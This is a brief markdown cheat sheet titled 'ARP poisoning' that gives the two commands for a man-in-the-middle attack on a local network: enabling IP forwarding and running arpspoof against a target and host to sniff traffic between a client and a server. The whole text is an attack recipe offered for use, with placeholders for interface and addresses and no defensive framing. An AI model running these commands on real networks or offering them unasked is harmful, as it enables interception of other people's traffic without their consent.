# ARP poisoning

Sniff traffic between a client and a server.

## Enable IP forwarding

`echo 1 > /proc/sys/net/ipv4/ip_forward`

## Start ARP spoofing

`arpspoof -i <DEVICE> -t <TARGET_IP> -r <HOST_IP>`